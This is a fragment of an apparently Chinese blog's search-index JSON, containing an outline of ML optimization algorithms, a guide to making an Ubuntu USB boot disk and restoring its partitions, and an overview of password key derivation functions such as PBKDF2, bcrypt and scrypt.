href=\"https://arthurchiao.art/blog/llama-paper-zh/\">上面论文的中文翻译</a></li>\n</ul>\n"},{"title":"大模型学习笔记之四：优化算法","url":"/2024/08/03/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>机器学习的优化（目标），简单来说是：搜索模型的一组参数 w，它能显著地降低代价函数 J(w)，该代价函数通常包括整个训练集上的性能评估（经验风险）和额外的正则化（结构风险）。与传统优化不同，它不是简单地根据数据的求解最优解，在大多数机器学习问题中，我们关注的是测试集（未知数据）上性能度量P的优化。</p>\n<p>对于模型，测试集是未知，我们只能通过优化训练集的性能度量P_train，在独立同分布基础假设下，期望测试集也有较好的性能（泛化效果），这意味并不是一味追求训练集的最优解。<br>另外，有些情况性能度量P（比如分类误差f1-score）并不能高效地优化，在这种情况下，我们通常会优化替代损失函数 (surrogate loss function)。例如，负对数似然通常用作 0 − 1 分类损失的替代。</p>\n<h2 id=\"二、主要算法\"><a href=\"#二、主要算法\" class=\"headerlink\" title=\"二、主要算法\"></a>二、主要算法</h2><h3 id=\"1-最小二乘法\"><a href=\"#1-最小二乘法\" class=\"headerlink\" title=\"1. 最小二乘法\"></a>1. 最小二乘法</h3><h3 id=\"2-梯度下降法\"><a href=\"#2-梯度下降法\" class=\"headerlink\" title=\"2. 梯度下降法\"></a>2. 梯度下降法</h3><h3 id=\"3-随机梯度下降法\"><a href=\"#3-随机梯度下降法\" class=\"headerlink\" title=\"3. 随机梯度下降法\"></a>3. 随机梯度下降法</h3><h3 id=\"4-Momentum-动量法\"><a href=\"#4-Momentum-动量法\" class=\"headerlink\" title=\"4. Momentum 动量法\"></a>4. Momentum 动量法</h3><h3 id=\"5-Nesterov-动量法\"><a href=\"#5-Nesterov-动量法\" class=\"headerlink\" title=\"5. Nesterov 动量法\"></a>5. Nesterov 动量法</h3><h3 id=\"6-Adagrad\"><a href=\"#6-Adagrad\" class=\"headerlink\" title=\"6. Adagrad\"></a>6. Adagrad</h3><h3 id=\"7-RMSProp\"><a href=\"#7-RMSProp\" class=\"headerlink\" title=\"7. RMSProp\"></a>7. RMSProp</h3><h3 id=\"8-Adam-算法\"><a href=\"#8-Adam-算法\" class=\"headerlink\" title=\"8. Adam 算法\"></a>8. Adam 算法</h3><h3 id=\"9-牛顿法\"><a href=\"#9-牛顿法\" class=\"headerlink\" title=\"9. 牛顿法\"></a>9. 牛顿法</h3><h3 id=\"遗传算法\"><a href=\"#遗传算法\" class=\"headerlink\" title=\"遗传算法\"></a>遗传算法</h3><h2 id=\"三、简要分析\"><a href=\"#三、简要分析\" class=\"headerlink\" title=\"三、简要分析\"></a>三、简要分析</h2><hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://cloud.tencent.com/developer/article/2014684\">一文概览神经网络优化算法</a></li>\n<li><a href=\"https://www.cvmart.net/community/detail/5691\">从梯度下降到 Adam！一文看懂各种神经网络优化算法</a></li>\n</ul>\n"},{"title":"如何制作Ubuntu的USB启动盘","url":"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/","content":"<p>这个周末新入手一台INTEL的NUC主机，八代i3版本，另外新购8G DDR4内存 + 256G NVME SSD硬盘.<br>本次采购是为了将网站改造为VPS + 本地Linux Server的模式，为此需要为NUC主机安装Ubuntu的Server版本。</p>\n<h2 id=\"Step-0-准备工作\"><a href=\"#Step-0-准备工作\" class=\"headerlink\" title=\"Step 0: 准备工作\"></a>Step 0: 准备工作</h2><ul>\n<li>An Intel NUC with BIOS updated to the latest version (update instructions)</li>\n<li>A USB 2.0 or 3.0 flash drive (4GB minimum for Dawson Canyon NUCs, 2GB for older generations)</li>\n<li><em><strong>A USB keyboard and a mouse</strong></em></li>\n<li>A monitor with an HDMI interface</li>\n<li>An HDMI cable</li>\n<li>A network connection with Internet access</li>\n</ul>\n<h2 id=\"Step-1：下载Ubuntu的ISO镜像文件\"><a href=\"#Step-1：下载Ubuntu的ISO镜像文件\" class=\"headerlink\" title=\"Step 1：下载Ubuntu的ISO镜像文件\"></a>Step 1：下载Ubuntu的ISO镜像文件</h2><ul>\n<li>Browser打开<a href=\"https://ubuntu.com/download/desktop\">Ubuntu官方网站</a></li>\n<li>寻找合适版本的ISO映像文件并下载，<em><strong>推荐采用BT下载方式。</strong></em></li>\n</ul>\n<img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/ubuntu-1.png\" class=\"\" title=\"Etcher的制作界面\">\n\n<blockquote>\n</blockquote>\n<pre><code>目前最新稳定版是Ubuntu 20，但从兼容性考虑，本次下载的是LTE长期稳定版v18.4.4\n可用版本分为Desktop和Server两种版本，本次选用Sever版本（大约900M，桌面版超过2G）\n在v16以前，除了主流的64位amd64 版本，还有32位的i386版本\n</code></pre>\n<img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/ubuntu-2.png\" class=\"\" title=\"Etcher的制作界面\">\n\n<h2 id=\"Step-2：格式化U盘\"><a href=\"#Step-2：格式化U盘\" class=\"headerlink\" title=\"Step 2：格式化U盘\"></a>Step 2：格式化U盘</h2><ul>\n<li>在Mac中打开<code>应用-&gt;其它-&gt;磁盘工具</code></li>\n<li>选择U盘，然后擦除。<em><strong>千万别选错了Mac的硬盘啊！！</strong></em></li>\n<li>选择格式: MS-DOS (FAT)，并执行“擦除”</li>\n</ul>\n<h2 id=\"Step-3-下载并安装Etcher工具\"><a href=\"#Step-3-下载并安装Etcher工具\" class=\"headerlink\" title=\"Step 3: 下载并安装Etcher工具\"></a>Step 3: 下载并安装Etcher工具</h2><blockquote>\n</blockquote>\n<pre><code>用于格式化和创建可引导USB闪存盘的工具主要有：Etcher 和 Rufus\nEther是Balena公司提供的开源软件，最大的优点是可以跨平台使用\n</code></pre>\n<ul>\n<li>Browser打开<a href=\"https://www.balena.io/etcher/\">Ether下载页面</a>，选择mac版本并下载</li>\n<li>打开DMG文件，并根据提示信息完成安装，过程中可能出现需要允许安装第三方软件的告警提示</li>\n</ul>\n<h2 id=\"Step-4-Etcher制作USB启动盘\"><a href=\"#Step-4-Etcher制作USB启动盘\" class=\"headerlink\" title=\"Step 4: Etcher制作USB启动盘\"></a>Step 4: Etcher制作USB启动盘</h2><img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/Etcher.jpg\" class=\"\" title=\"Etcher的制作界面\">\n\n<ul>\n<li>选择ISO镜像文件</li>\n<li>选择USB驱动器，<em><strong>不要搞错了硬盘</strong></em></li>\n<li>写入USB盘，大概需要十分钟后，大功告成！</li>\n</ul>\n<hr>\n<h2 id=\"疑难杂症：如何恢复USB启动盘的硬盘分区\"><a href=\"#疑难杂症：如何恢复USB启动盘的硬盘分区\" class=\"headerlink\" title=\"疑难杂症：如何恢复USB启动盘的硬盘分区\"></a>疑难杂症：如何恢复USB启动盘的硬盘分区</h2><p>制作过Ubuntu iso的U盘会变成只有几M的空间，格式化也没有用，原因是Etcher修改了硬盘分区表。<br>解决办法是，在Windows下搜索运行<code>diskpart</code>软件，参考命令行是：</p>\n<pre><code><figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\">DISKPART&gt; list disk</span><br><span class=\"line\">DISKPART&gt; select disk <span class=\"number\">2</span> （具体选<span class=\"number\">1</span>还是<span class=\"number\">2</span>要根据实际情况，小心操作！！）</span><br><span class=\"line\">DISKPART&gt; clean</span><br><span class=\"line\">DISKPART&gt; create partition primary</span><br><span class=\"line\">DISKPART&gt; <span class=\"keyword\">exit</span></span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>而如果在Linux下，那就更简单了，用fdisk命令就行。</p>\n<pre><code><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">fdisk -l</span> </span><br><span class=\"line\">列出/dev 下面的所有硬盘设备，例如 /dev/sda， /dev/sdb， /dev/sdc</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">fdisk /dev/sdb</span></span><br><span class=\"line\">选择需要修改的硬盘，按照命令提升处理，大致是：</span><br><span class=\"line\">    p 列出分区表</span><br><span class=\"line\">    d 删除分区</span><br><span class=\"line\">    n 新建分区</span><br><span class=\"line\">    w 存盘退出！！！</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>补充以下，如果在Mac OS上，虽然没有<code>fdisk</code>命令，但是可以用<code>diskutil</code>命令代替</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">JiandeiMac:~ sj$ diskutil</span><br><span class=\"line\">Disk Utility Tool</span><br><span class=\"line\">Utility to manage <span class=\"built_in\">local</span> disks and volumes</span><br><span class=\"line\">Most commands require an administrator or root user</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Most destructive operations are not prompted</span><br><span class=\"line\"></span><br><span class=\"line\">Usage:  diskutil [quiet] &lt;verb&gt; &lt;options&gt;, <span class=\"built_in\">where</span> &lt;verb&gt; is as follows:</span><br><span class=\"line\"></span><br><span class=\"line\">    list                 (List the partitions of a disk)</span><br><span class=\"line\">    info[rmation]        (Get information on a specific disk or partition)</span><br><span class=\"line\">    listFilesystems      (List file systems available <span class=\"keyword\">for</span> formatting)</span><br><span class=\"line\">    activity             (Continuous <span class=\"built_in\">log</span> of system-wide disk arbitration)</span><br><span class=\"line\"></span><br><span class=\"line\">    u[n]mount            (Unmount a single volume)</span><br><span class=\"line\">    unmountDisk          (Unmount an entire disk (all volumes))</span><br><span class=\"line\">    eject                (Eject a disk)</span><br><span class=\"line\">    mount                (Mount a single volume)</span><br><span class=\"line\">    mountDisk            (Mount an entire disk (all mountable volumes))</span><br><span class=\"line\"></span><br><span class=\"line\">    enableJournal        (Enable HFS+ journaling on a mounted HFS+ volume)</span><br><span class=\"line\">    disableJournal       (Disable HFS+ journaling on a mounted HFS+ volume)</span><br><span class=\"line\">    moveJournal          (Move the HFS+ journal onto another volume)</span><br><span class=\"line\">    enableOwnership      (Exact on-disk User/Group IDs on a mounted volume)</span><br><span class=\"line\">    disableOwnership     (Ignore on-disk User/Group IDs on a mounted volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    rename[Volume]       (Rename a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    verifyVolume         (Verify the file system data structures of a volume)</span><br><span class=\"line\">    repairVolume         (Repair the file system data structures of a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    verifyDisk           (Verify the components of a partition map of a disk)</span><br><span class=\"line\">    repairDisk           (Repair the components of a partition map of a disk)</span><br><span class=\"line\"></span><br><span class=\"line\">    eraseDisk            (Erase an existing disk, removing all volumes)</span><br><span class=\"line\">    eraseVolume          (Erase an existing volume)</span><br><span class=\"line\">    reformat             (Erase an existing volume with same name and <span class=\"built_in\">type</span>)</span><br><span class=\"line\">    eraseOptical         (Erase optical media (CD/RW, DVD/RW, etc.))</span><br><span class=\"line\">    zeroDisk             (Erase a disk, writing zeros to the media)</span><br><span class=\"line\">    randomDisk           (Erase a disk, writing random data to the media)</span><br><span class=\"line\">    secureErase          (Securely erase a disk or freespace on a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    partitionDisk        ((re)Partition a disk, removing all volumes)</span><br><span class=\"line\">    resizeVolume         (Resize a volume, increasing or decreasing its size)</span><br><span class=\"line\">    splitPartition       (Split an existing partition into two or more)</span><br><span class=\"line\">    mergePartitions      (Combine two or more existing partitions into one)</span><br><span class=\"line\"></span><br><span class=\"line\">    appleRAID &lt;verb&gt;     (Perform additional verbs related to AppleRAID)</span><br><span class=\"line\">    coreStorage &lt;verb&gt;   (Perform additional verbs related to CoreStorage)</span><br><span class=\"line\">    apfs &lt;verb&gt;          (Perform additional verbs related to APFS)</span><br><span class=\"line\"></span><br><span class=\"line\">diskutil &lt;verb&gt; with no options will provide help on that verb</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</code></pre>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://ubuntu.com/download/intel-nuc-desktop\">Ubuntu关于NUC安装的官方说明</a></li>\n<li><a href=\"https://linux.cn/article-11477-1.html\">NUC主机安装Ubuntu的操作案例</a></li>\n<li><a href=\"https://tutorials.ubuntu.com/tutorial/tutorial-create-a-usb-stick-on-macos\">制作启动USB盘的Ubuntu官方教程</a></li>\n<li><a href=\"http://www.eguidedog.net/doc/doc-create-usb-stick-on-windows.php\">Windows如何制作Ubuntu系统的USB启动盘</a></li>\n<li><a href=\"https://github.com/balena-io/etcher\">Etcher的Github地址</a></li>\n</ul>\n"},{"title":"密钥派生函数（KDF）概述","url":"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"一、什么是-KDF\"><a href=\"#一、什么是-KDF\" class=\"headerlink\" title=\"一、什么是 KDF\"></a>一、什么是 KDF</h2><p>KDF（Key Derivation Function）的最初用途是密钥派生，即从秘密密码或密码短语生成密钥。</p>\n<h3 id=\"1、密钥拉伸（Key-Stretching）\"><a href=\"#1、密钥拉伸（Key-Stretching）\" class=\"headerlink\" title=\"1、密钥拉伸（Key Stretching）\"></a>1、密钥拉伸（Key Stretching）</h3><p>在系统要求用户设置密码时，我们习惯用4-6位的数字组合，或者字母、数字和特殊符号的某种组合，这种密码强度肯定无法抵御暴力破解、字典攻击、彩虹表攻击等技术手段，密钥派生函数由此应运而生。</p>\n<p>KDF 最基础的用途是将密码和其他弱密钥材料来源转换为强密钥，文绉绉地说，就是采用具有低熵（安全性或随机性）的密钥，并将其扩展为更安全的更长密钥。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">derivedKey = <span class=\"title function_\">keyDerivationFunction</span>(originalKey, salt, difficulty)</span><br></pre></td></tr></table></figure>\n\n<p>密钥派生函数接受一个密码（或其他弱密钥材料）作为输入，通过一个特殊函数运行它，然后输出安全密钥材料，关键点是增加了一个随机数作为加密因子，这个随机数被称为<strong>盐（Salt）</strong>，针对预计算攻击或rainbow表的随机数据，而<code>difficulty</code> 是难度系数的标记，例如迭代计算的次数。</p>\n<p><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/key-derivation-function.png\" alt=\"KDF\"></p>\n<p>以Apple数据保护技术为例，就是将4-6位的用户锁屏密码<code>Passcode</code>转化为256位的密文<code>Passcode Key</code>。</p>\n<h3 id=\"2、密钥分离（Key-Separation）\"><a href=\"#2、密钥分离（Key-Separation）\" class=\"headerlink\" title=\"2、密钥分离（Key Separation）\"></a>2、密钥分离（Key Separation）</h3><p>KDF允许从单一的密钥材料（主密钥）生成多个不同用途的子密钥，方法是通过使用不同的 salt 随机数，这也被称为密钥多样化（Key Diversification）。</p>\n<p>这种方式可以防止获得派生密钥的攻击者学习关于输入秘密值或任何其他派生密钥的有用信息，子密钥可以控制业务的某个部分，但只有主密钥具有完全控制权。例如，Apple 的 Secure Enclave 就以 UID 为根，派生出用于保护 Class Key 的<code>Key 0x835</code>和 用于保护 EMF Key 的<code>Key 0x89B</code>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x835</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;01010101010101010101010101010101&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x836</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;00E5A0E6526FAE66C5C1C6D4F16D6180&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x838</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;8C8318A27D7F030717D2B8FC5514F8E1&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x89B</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;183e99676bb03c546fa468f51c0cbd49&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、密钥强化（Key-Strengthening）\"><a href=\"#3、密钥强化（Key-Strengthening）\" class=\"headerlink\" title=\"3、密钥强化（Key Strengthening）\"></a>3、密钥强化（Key Strengthening）</h3><p>密钥强化同样使用随机盐扩展密钥，但随后<strong>删除该盐</strong>，这使得生成的密钥更强壮，但也意味着后续无法直接验证，<strong>即使合法用户也必须进行暴力破解验证</strong>。<br>但是，由于合法用户掌握了passcode等部分信息，暴力破解难度远远低于非法用户，但仍然需要消耗大量算力，因此实际应用中并不多见。</p>\n<h2 id=\"二、KDF-Vs-Hash\"><a href=\"#二、KDF-Vs-Hash\" class=\"headerlink\" title=\"二、KDF Vs Hash\"></a>二、KDF Vs Hash</h2><p>理论上，KDF 可以采用 3DES 或 AES 等对称算法，好处是可以通过密钥恢复原文，但密钥保管是个大麻烦，一旦泄露所有密码就全部暴露，因此在实际应用中主要采用哈希算法。</p>\n<p>一个理想的加密哈希函数，应当具有如下属性：</p>\n<ul>\n<li>快速：计算速度要足够快</li>\n<li>确定性：对同样的输入，应该总是产生同样的输出</li>\n<li>难以分析：对输入的任何微小改动，都应该使输出完全发生变化</li>\n<li>不可逆：从其哈希值逆向演算出输入值应该是不可行的。这意味着暴力破解是唯一方法</li>\n<li>无碰撞：找到具有相同哈希值的两条不同消息应该非常困难（或几乎不可能）</li>\n</ul>\n<p>这些特点非常适合密钥派生的业务场景，可以确保即使密码文件本身被泄露也能保护密码，同时又能方便地验证用户密码，代价是要同时保存每个用户的密文和随机数。</p>\n<p><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/KDF.png\" alt=\"KDF Vs Hash\"><br>可以证明，所有基于哈希的 KDF 都是安全的哈希函数，但并非所有哈希函数都是基于哈希的 KDF。<br>尽管高吞吐量是通用哈希函数的理想属性，但在密码安全应用程序中则相反，防御暴力破解是主要关注点，因此 KDF 要求的是<strong>故意缓慢的哈希算法</strong>。</p>\n<p>KDF 计算速度的”慢”是相对而言的，对于普通用户而言，KDF 通常只需要在登录时被执行一次，因此慢这么一点点完全可以接受，而且用户也完全有足够的资源执行这个 KDF 函数。 但是如果一个黑客想要通过 Hash 碰撞来猜测出用户的密码，那它就必须执行海量的 KDF 计算，这个时候 KDF 的威力就显现出来了 —— 黑客将需要提供海量的 CPU&#x2F;GPU 计算资源、海量的内存资源才能完成目标，而这显然得不偿失，这样 KDF 就确保了用户密码的安全性。</p>\n<p>提升 Hash 算法的碰撞难度，主要从以下三个方向入手：</p>\n<ul>\n<li>时间复杂度：对应 CPU&#x2F;GPU 计算资源</li>\n<li>空间复杂度：对应 Memory 内存资源</li>\n<li>并行维度：使用无法分解的算法，锁定只允许单线程运算</li>\n</ul>\n<h2 id=\"三、主流算法\"><a href=\"#三、主流算法\" class=\"headerlink\" title=\"三、主流算法\"></a>三、主流算法</h2><h3 id=\"1-crypt\"><a href=\"#1-crypt\" class=\"headerlink\" title=\"1. crypt\"></a>1. crypt</h3><p>第一个基于密码的密钥派生函数被称为“ crypt ”（或在其手册页之后的“crypt(3)” ），由 Robert Morris 在 1978 年发明。<br>crypt 算法将加密一个常数（零），使用用户密码的前 8 个字符作为密钥，通过执行修改后的DES加密算法的 25 次迭代（其中使用从实时计算机时钟读取的 12 位数字来干扰计算），生成的 64 位数字被编码为 11 个可打印字符，然后存储在Unix密码文件中。<br>虽然这在当时是一个巨大的进步，但自 PDP-11 以来处理器速度的提高使得针对 crypt 的暴力攻击成为可能，并且 12 位盐的加密强度不足。此外，crypt 函数的设计还将用户密码限制为 8 个字符，这就限制了密钥空间。</p>\n<h3 id=\"2-PBKDF2（Password-Based-Key-Derivation-Function）\"><a href=\"#2-PBKDF2（Password-Based-Key-Derivation-Function）\" class=\"headerlink\" title=\"2. PBKDF2（Password-Based Key Derivation Function）\"></a>2. PBKDF2（Password-Based Key Derivation Function）</h3><p>基本原理是通过一个伪随机函数（例如 HMAC 函数），把明文和一个随机盐作为输入参数，然后重复进行运算，并最终产生密钥。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">DK</span> = <span class=\"title class_\">PBKDF2</span>(<span class=\"variable constant_\">PRF</span>, password, salt, c, dk_len)</span><br></pre></td></tr></table></figure>\n\n<p>其中，PRF 表示使用何种哈希算法（通常是 SHA1 或者 SHA256），password 是人类可读密码，salt 是随机生成的盐（一般不能少于8字节），c 是迭代次数（至少1000次），dk_len 是最终生成的 key 的长度，也就是加密算法的块大小。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/PBKDF2.png\" alt=\"PBKDF2\"></p>\n<p>该算法的优点是标准化，技术实现容易，而且导出密钥的长度本质上是没有限制的，但是其最大有效搜索空间受限于基本伪随机函数的结构。<br>典型应用是 Wi-Fi 的 WPA2 密码保护协议就是采用这个算法，即：<br><code>DK = PBKDF2(HMAC−SHA1, passphrase, ssid, 4096, 256)</code></p>\n<blockquote>\n<p>最近几年比特币挖矿的发展，让大家看到专有硬件、GPU 在对付大规模哈希时的威力。像 PBKDF2 这样简单使用 SHA256，看起来已经不太保险了</p>\n</blockquote>\n<h3 id=\"3-Bcrypt（Blowfish-crypt）\"><a href=\"#3-Bcrypt（Blowfish-crypt）\" class=\"headerlink\" title=\"3. Bcrypt（Blowfish crypt）\"></a>3. Bcrypt（Blowfish crypt）</h3><p>Blowfish（河豚）是一个对称密钥加密的分组密码算法，由布鲁斯·施奈尔于 1993 年设计用于替代陈旧的 DES 算法，强调完全开源，无须授权即可使用。<br>1999年，Niels Provos 和 David Mazières 改进了 Blowfish 算法，通过增加每次迭代的计算开销，达到提升破解难度的目标，并成为 OpenBSD 和许多Linux 发行版（如SUSE Linux）的默认密码哈希算法。</p>\n<p>Bcrypt的工作原理，就是对字符串<code>OrpheanBeholderScryDoubt</code>进行64次 blowfish 加密得到的结果，而用户密码就是该字符串的加密因子之一。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function bcrypt</span><br><span class=\"line\">   Input:</span><br><span class=\"line\">      cost:     Number (<span class=\"number\">4.</span><span class=\"number\">.31</span>)                      log2(Iterations). e.g. <span class=\"number\">12</span> ==&gt; <span class=\"number\">212</span> = <span class=\"number\">4</span>,096 iterations</span><br><span class=\"line\">      salt:     array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">16</span> bytes)</span>           random salt</span><br><span class=\"line\">      password: array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">1.</span><span class=\"number\">.72</span> bytes)</span>        UTF-<span class=\"number\">8</span> encoded password</span><br><span class=\"line\">   Output: </span><br><span class=\"line\">      hash:     array of <span class=\"title function_\">Bytes</span> <span class=\"params\">(<span class=\"number\">24</span> bytes)</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 初始化方法，用于生成 K 数组和 S-box 空间，此步骤非常耗时</span></span><br><span class=\"line\">   <span class=\"comment\">//P: array of 18 subkeys (UInt32[18])</span></span><br><span class=\"line\">   <span class=\"comment\">//S: Four substitution boxes (S-boxes), S0...S3. Each S-box is 1,024 bytes (UInt32[256])</span></span><br><span class=\"line\">   P, S &lt;- EksBlowfishSetup(cost, salt, password)   </span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// 基于 24 位初始向量，使用 Blowfish 算法的 ECB 模式，进行 64 轮的迭代加密</span></span><br><span class=\"line\">   ctext &lt;- <span class=\"string\">&quot;OrpheanBeholderScryDoubt&quot;</span>  <span class=\"comment\">//24 bytes ==&gt; three 64-bit blocks</span></span><br><span class=\"line\">   repeat (<span class=\"number\">64</span>)</span><br><span class=\"line\">      ctext &lt;-  EncryptECB(P, S, ctext) <span class=\"comment\">//encrypt using standard Blowfish in ECB mode</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">//24-byte ctext is resulting password hash</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span> Concatenate(cost, salt, ctext)</span><br></pre></td></tr></table></figure>\n\n<p>BCrypt算法将 salt 随机并混入最终加密后的密码，形成一个 60 位的 bcrypt hash 密文，因此验证时无需单独提供之前的 salt。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">2a$10<span class=\"variable\">$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy</span></span></span><br><span class=\"line\">\\__/\\/ \\____________________/\\_____________________________/</span><br><span class=\"line\"> Alg Cost      Salt                        Hash</span><br></pre></td></tr></table></figure>\n\n<p>该表示中 <code>$</code> 是各个字段的分隔符，包括：</p>\n<ul>\n<li>2a：  表示的hash算法的唯一标志。这里表示的是bcrypt算法。</li>\n<li>10：  表示的是代价因子，这里是2的10次方，也就是1024轮。</li>\n<li>N9qo8uLOickgx2ZMRZoMye ：             是16个字节的 salt 经过 base64 编码得到的 22 长度的字符</li>\n<li>IjZAgcfl7p92ldGxad68LJZdL17lhWy：     是24个字节的 hash，经过 bash64 的编码得到的 31 长度的字符</li>\n</ul>\n<blockquote>\n<p>Blowfish算法由于分组长度太小已被认为不安全，替代方案是使用 Twofish 密码，有128、192、256位三种密钥长度可供选择，块大小为128位</p>\n</blockquote>\n<h3 id=\"4-Scrypt\"><a href=\"#4-Scrypt\" class=\"headerlink\" title=\"4. Scrypt\"></a>4. Scrypt</h3><p>比特币最最被人诟病的就是它使用的POW算法，谁的算力高，谁就可以挖矿。传统的基于 CPU 计算的算法逐渐被一些特制的 ASIC &#x2F; FPGA 处理器打败，这些专用处理器不做别的，就是破解你的密码或者进行哈希运算，为此科学家们发明了很多其他的算法，比如需要占用大量内存的算法，因为内存不像CPU可以疯狂提速，所以限制了很多暴力破解的场景。</p>\n<p>Scrypt 是一种密码衍生算法，它是由 Colin Percival 创建的，特点是根据初始化的主密码来生成系列的衍生密码，2016年已列入 RFC 7914 标准。<br>Scrypt 内部用的还是 PBKDF2 （Salsa20算法），但会长时间地维护一组非常大的伪随机数序列，用于后续的 key 生成过程中，其算法表达式为：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">DK</span> = <span class=\"title class_\">Scrypt</span>(salt, dk_len, n, r, p)</span><br></pre></td></tr></table></figure>\n\n<p>其中的 salt 是一段随机的盐，dk_len 是输出的哈希值的长度。n 是 CPU&#x2F;Memory 开销值，越高的开销值，计算就越困难。r 表示块大小，p 表示并行度。<br>在高敏感的场景，推荐使用参数为 <code>n = 2 ** 20, r = 8</code>，此时需要消耗 1 GB内存。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function scrypt</span><br><span class=\"line\">   Inputs: This algorithm includes the following parameters:</span><br><span class=\"line\">      Passphrase:                Bytes    string of characters to be hashed</span><br><span class=\"line\">      Salt:                      Bytes    string of random characters that modifies the hash to protect against Rainbow table attacks</span><br><span class=\"line\">      <span class=\"title function_\">CostFactor</span> <span class=\"params\">(N)</span>:            Integer  CPU/memory cost parameter – Must be a power of <span class=\"number\">2</span> (e.g. <span class=\"number\">1024</span>)</span><br><span class=\"line\">      BlockSizeFactor (r):       Integer  blocksize parameter, which fine-tunes sequential memory read size and performance. (<span class=\"number\">8</span> is commonly used)</span><br><span class=\"line\">      ParallelizationFactor (p): Integer  Parallelization parameter. (<span class=\"number\">1</span> .. <span class=\"number\">232</span>-<span class=\"number\">1</span> * hLen/MFlen)</span><br><span class=\"line\">      DesiredKeyLen (dkLen):     Integer  Desired key length in <span class=\"title function_\">bytes</span> <span class=\"params\">(Intended output length in octets of the derived key; a positive integer satisfying dkLen ≤ (<span class=\"number\">232</span>− <span class=\"number\">1</span>)</span> * hLen.)</span><br><span class=\"line\">      hLen:                      Integer  The length in octets of the hash <span class=\"title function_\">function</span> <span class=\"params\">(<span class=\"number\">32</span> <span class=\"keyword\">for</span> SHA256)</span>.</span><br><span class=\"line\">      MFlen:                     Integer  The length in octets of the output of the mixing <span class=\"title function_\">function</span> <span class=\"params\">(SMix below)</span>. Defined as r * <span class=\"number\">128</span> in 